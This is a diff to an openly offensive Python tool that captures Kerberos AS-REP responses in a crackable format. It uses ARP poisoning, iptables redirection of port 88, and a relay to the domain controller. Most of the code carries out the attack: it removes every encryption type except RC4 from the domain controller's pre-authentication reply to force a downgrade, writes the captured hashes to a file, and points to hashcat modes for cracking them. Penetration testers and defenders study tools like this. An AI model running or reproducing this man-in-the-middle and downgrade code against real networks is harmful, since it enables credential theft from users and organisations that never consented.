@@ -10,7 +10,6 @@ from scapy.all import *
 import asn1
 import os
 import argparse
-from argparse import RawTextHelpFormatter
 import time
 import threading
 import ipaddress
@@ -31,7 +30,10 @@ def handle_KRB_AS_REP(packet):
         decoder.start(bytes(packet.root.crealm))
         domain = decoder.read()[1].decode().lower()
         if username not in UsernamesSeen and username not in UsernamesCaptured :
-            logging.info(f'[+] Sniffed TGS-REP for user {username}@{domain}')
+            if username.endswith('$'):
+                logging.debug(f'[+] Sniffed TGS-REP for user {username}@{domain}')
+            else :
+                logging.info(f'[+] Sniffed TGS-REP for user {username}@{domain}')
             UsernamesSeen.add(username)
             return
     if not packet.haslayer(KRB_AS_REP):
@@ -42,7 +44,7 @@ def handle_KRB_AS_REP(packet):
     domain = decoder.read()[1].decode().lower()
     logging.info(f'[+] Got ASREP for username : {username}@{domain}')
     if username.endswith('$') :
-        logging.debug(f'[*] Machine account : {username}, skipping...')
+        logging.info(f'[*] Machine account : {username}, skipping...')
         return
     decoder.start(bytes(packet.root.encPart.etype))
     etype = decoder.read()[1]
@@ -68,9 +70,9 @@ def handle_KRB_AS_REP(packet):
         else :
             UsernamesCaptured[username] = [etype]
     if etype == 17 and HashFormat == 'hashcat' :
-        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/hashcat-6.2.6+813.7z mode : 32100 ')
+        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32100 ')
     if etype == 18 and HashFormat == 'hashcat' :
-        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/hashcat-6.2.6+813.7z mode : 32200 ')
+        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32200 ')
     with open(outfile, 'a') as f:
         f.write(HashToCrack + '\n')
     if mode == 'listen' and not keep_spoofing and not disable_spoofing :
@@ -190,7 +192,6 @@ async def handle_client(reader, writer):
 
 async def relay_to_dc(data, client_address):
     host = dc
-    port = 88
     kerberos_packet = KerberosTCPHeader(data)
     if kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 :
         decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
@@ -202,6 +203,7 @@ async def relay_to_dc(data, client_address):
                 logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
         else :
             logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
+    
     reader, writer = await asyncio.open_connection(dc,88)
     writer.write(data)
     await writer.drain()
@@ -211,7 +213,6 @@ async def relay_to_dc(data, client_address):
     krb_response = KerberosTCPHeader(response)
 
     if krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19 :
-        logging.info('[+] Hijacking Kerberos encryption negotiation...')
         RC4_present = False
         indexes_to_delete = []
         for idx, x in enumerate(krb_response.root.eData[0].seq[0].padataValue.seq) :
@@ -219,9 +220,16 @@ async def relay_to_dc(data, client_address):
                 RC4_present = True
             else :
                 indexes_to_delete.append(idx)
+            if type(x.salt) == ASN1_GENERAL_STRING:
+                decoder.start(bytes(x.salt))
+                salt = decoder.read()[1].decode().lower()
+                if bool(re.search(r'([a-z0-9]+\.[a-z0-9]+)host.*\1$', salt)) :
+                    logging.info(f'[+] Machine account. Skipping RC4 downgrading...')
+                    return response
         if not RC4_present :
             logging.warning("[!] RC4 not found in DC's supported algorithms. Downgrade to RC4 will not work")
             return response
+        logging.info('[+] Hijacking Kerberos encryption negotiation...')
         for i in indexes_to_delete :
             del krb_response.root.eData[0].seq[0].padataValue.seq[i]
         krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos])) 
@@ -235,17 +243,20 @@ async def relay_to_dc(data, client_address):
         return response
     return response
 
-async def relay_server():
-    os.system("iptables-save > asrepcatcher_rules.v4")
+async def kerberos_server():
+    try :
+        os.system("iptables-save > /tmp/asrepcatcher_rules.v4")
+    except Exception as e :
+        logging.error(f'[!] Could not back up iptables : {e}')
+        sys.exit(1)
     os.system("iptables -F")
     os.system("iptables -F -t nat")
-    logging.info('[*] Saved current iptables\n\n')
+    logging.debug('[*] Saved current iptables\n\n')
     os.system(f'iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 88 -j DNAT --to 127.0.0.1:88')
     os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=1 1>/dev/null')
-
+    print('\n')
+    
     server = await asyncio.start_server(handle_client, '0.0.0.0', 88)
-
-    loop = asyncio.get_event_loop()
 
     async with server:
         await server.serve_forever()
@@ -253,7 +264,7 @@ async def relay_server():
 
 def relay_mode() :
     try:
-        asyncio.run(relay_server())
+        asyncio.run(kerberos_server())
     except KeyboardInterrupt:
         pass
     finally :
@@ -262,7 +273,7 @@ def relay_mode() :
             stop_arp_spoofing_flag.set()
             logging.info(f'[*] Restoring arp cache of {len(Targets)} poisoned targets, please hold...')
             restore_all_targets()
-        os.system("iptables-restore < asrepcatcher_rules.v4")
+        os.system("iptables-restore < /tmp/asrepcatcher_rules.v4")
         logging.info("[*] Restored iptables")
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         logging.info('[*] Disabled IPV4 forwarding')
@@ -292,11 +303,11 @@ def display_banner():
                             """)
 
 if __name__ == '__main__':
-    if not 'SUDO_UID' in os.environ:
+    if os.geteuid() != 0 :
         logging.error("Please run as root")
         sys.exit(1)
 
-    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=RawTextHelpFormatter)
+    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=argparse.RawTextHelpFormatter)
 
     parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Force clients to use RC4 if supported.\n"
                                                                                     "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
@@ -307,10 +318,10 @@ if __name__ == '__main__':
     group = parser.add_argument_group('ARP poisoning')
 
     group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
-    group.add_argument('-tf', action='store', help='File containing client workstations IP addresses.')
-    group.add_argument('-gw', action='store', help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
-    parser.add_argument('-dc', action='store', help='Domain controller\'s IP.')
-    parser.add_argument('-iface', action='store', help='Interface to use. Uses default interface if not specified.')
+    group.add_argument('-tf', action='store', metavar = "targets file", help='File containing client workstations IP addresses.')
+    group.add_argument('-gw', action='store', metavar = "Gateway IP", help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
+    parser.add_argument('-dc', action='store', metavar = "DC IP", help='Domain controller\'s IP.')
+    parser.add_argument('-iface', action='store', metavar = "interface", help='Interface to use. Uses default interface if not specified.')
     group.add_argument('--keep-spoofing', action='store_true', default=False, help='Keeps poisoning the targets after capturing AS-REP packets. False by default.')
     group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')
 
@@ -343,9 +354,9 @@ if __name__ == '__main__':
     debug = parameters.debug
 
     if debug :
-        logging.basicConfig(level=logging.DEBUG)
+        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
     else :
-        logging.basicConfig(level=logging.INFO)
+        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
 
     if parameters.mode == 'relay' and parameters.dc is None :
         logging.error('[!] Must specify DC IP in relay mode. Quitting...')
@@ -370,7 +381,7 @@ if __name__ == '__main__':
     HashesCaptured = set()
     logging.info(f'[*] Interface : {iface}')
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    logging.info('[*] Enabled IPV4 forwarding')
+    logging.debug('[*] Enabled IPV4 forwarding')
 
     if not disable_spoofing :
         if parameters.t is not None :
@@ -404,7 +415,7 @@ if __name__ == '__main__':
             logging.info('[*] Found gateway in targets list. Removing it')
             TargetsList.remove(gw)
 
-        logging.info(f'[*] Scanning {iface} subnet')
+        logging.debug(f'[*] Scanning {iface} subnet')
         mac_addresses = get_all_mac_addresses()
 
         if gw not in mac_addresses :
